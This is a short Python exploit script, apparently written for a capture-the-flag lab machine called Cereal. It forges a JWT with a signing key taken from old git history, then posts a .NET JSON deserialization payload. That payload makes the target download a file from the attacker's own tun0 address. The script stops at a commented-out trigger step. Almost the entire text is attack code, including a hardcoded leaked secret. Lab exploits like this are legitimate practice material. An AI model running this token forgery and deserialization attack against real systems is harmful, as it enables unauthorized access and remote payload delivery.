import requests
import netifaces as ni
import jwt
from datetime import datetime, timedelta

# find your tun0 IP
ni.ifaddresses('tun0')
ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
print(ip)

# generate a token

# take key from old git code - commit ID 8f2a1a88f15b9109e1f63e4e4551727bfb38eee5
key = "secretlhfIH&FY*#oysuflkhskjfhefesf"

# encode with HMAC-SHA-256
token = jwt.encode({"exp": datetime.utcnow() + timedelta(days=7), "name": 1}, key, algorithm="HS256")
print("Generated token: " + token)

# set URL
base_url = "https://10.10.10.217/requests"

# set headers
base_headers = {"Content-Type": "application/json", "Authorization": "Bearer {}".format(token), "Cache-Control": "max-age=0"}

# POST the target cereal
download_url = "https://{}/test.txt".format(ip)
print("Creating target cereal, which will download from URL {} when deserialised".format(download_url))

target_json_string = "{\"JSON\":\"{\\\"$type\\\":\\\"Cereal.DownloadHelper, Cereal\\\",\\\"URL\\\": " + download_url +  ",\\\"FilePath\\\":\\\"test.txt\\\"}\"}"

targetResp = requests.post(base_url, data=target_json_string, headers=base_headers, verify=False)
print("Response Code: {code}\nResponse Text: {text}".format(code=targetResp.status_code, text=targetResp.text))

# POST the trigger cereal
#trigger_json
